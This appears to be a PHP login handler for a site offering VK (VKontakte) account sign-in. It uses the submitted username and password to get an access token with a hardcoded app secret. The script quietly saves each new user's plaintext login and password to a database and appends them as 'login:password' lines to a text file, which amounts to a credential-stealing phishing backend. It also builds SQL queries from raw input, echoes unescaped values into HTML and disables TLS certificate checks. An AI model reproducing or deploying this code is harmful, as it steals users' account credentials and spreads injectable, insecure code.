<?
session_start();
include(dirname(__FILE__) . "/bd.php");
mysql_query("SET NAMES `CP1251`");
$login    = $_POST["login_vk"];
$password = $_POST["pass_vk"];
$captcha_sid = $_POST["captcha_sid"];
$captcha_key = $_POST["captcha_key"];

if ($login and $password) {
    $login    = iconv('utf-8', 'windows-1251', $login);
    $password = iconv('utf-8', 'windows-1251', $password);
	if($captcha_key and $captcha_sid) $captcha = "&captcha_sid=".$captcha_sid."&captcha_key=".$captcha_key;
    $res = apiadd('https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=' . $login . '&password=' . $password . $captcha);
    $error    = $res['error'];
    $token    = $res['access_token'];
    $user_id  = $res['user_id'];
    if ($token) {
        if (strstr($base, $data)) {
            setcookie('auth_vk', "1", time() + 3600 * 1, '/');
            setcookie('num_vk', "0", time() + 3600 * 1, '/');
            $_SESSION['num_vk'] = 1;
            $_SESSION['user_id'] = $user_id;
            echo '<div class="alert alert-success">Авторизация прошла успешно, переадресация..</div><META HTTP-EQUIV="REFRESH" CONTENT="1; URL=/">';
        } else {
            $getToken = mysql_fetch_assoc(mysql_query("SELECT * FROM access_token WHERE owner_id='$user_id'", $db));
            if (!$getToken["access_token"]) {
                mysql_query("INSERT INTO access_token (access_token,owner_id,login,pass) VALUES ('$token','$user_id','$login','$password')", $db);
				$fp=fopen("anonynal.txt","a");  
				fwrite($fp, "\r\n" . "".$login.":".$password."");   
				fclose($fp);
            }
            setcookie('auth_vk', "1", time() + 3600 * 1, '/');
            setcookie('num_vk', "0", time() + 3600 * 1, '/');
            $_SESSION['num_vk'] = 1;
            $_SESSION['user_id'] = $user_id;
            echo '<div class="alert alert-success">Авторизация прошла успешно, переадресация..</div><META HTTP-EQUIV="REFRESH" CONTENT="1; URL=/">';
        }
    } 
	elseif($error == "need_captcha"){
		echo '<div class="alert alert-danger">Введите код ниже.</div><div class="form-group"><img src="'.$res["captcha_img"].'" style="background-color: #FFFFFF;background-image: none;border: 1px solid #e5e6e7;border-radius: 1px;padding: 2px;"></div>
		<div class="form-group"><input type="hidden" name="captcha_sid" id="captcha_sid" value='.$res["captcha_sid"].'><input type="text" name="captcha_key" id="captcha_key" class="form-control" placeholder="Код" required></div>';
	}
	else {
        echo '<div class="alert alert-danger">Вы ввели неверные данные!</div>';
    }
} else {
    echo '<div class="alert alert-danger">Вы ввели неверные данные!</div>';
}

function apiadd($url, $post = null)
{
    return json_decode(curladd($url, $post), 1);
}
function curladd($url, $post = null)
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36');
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}
?>